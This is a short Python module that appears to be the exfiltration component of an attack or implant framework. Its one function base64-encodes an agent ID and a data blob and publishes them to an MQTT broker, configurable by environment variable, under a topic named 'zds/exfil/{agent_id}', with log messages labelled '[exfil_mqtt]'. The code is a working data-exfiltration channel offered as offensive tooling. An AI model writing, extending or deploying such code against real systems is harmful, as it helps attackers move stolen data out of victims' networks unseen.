import base64
import json
import os
import paho.mqtt.publish as publish


def send_via_mqtt(agent_id: str, data_blob: dict) -> bool:
    broker = os.environ.get("ZDS_MQTT_BROKER", "127.0.0.1")
    port   = int(os.environ.get("ZDS_MQTT_PORT", "1883"))
    topic  = f"zds/exfil/{agent_id}"
    if not broker:
        return False
    try:
        payload = base64.b64encode(
            json.dumps({"agent_id": agent_id, "data": data_blob}).encode()
        ).decode()
        publish.single(topic, payload=payload, hostname=broker, port=port)
        return True
    except Exception as e:
        print(f"[exfil_mqtt] failed: {e}")
        return False
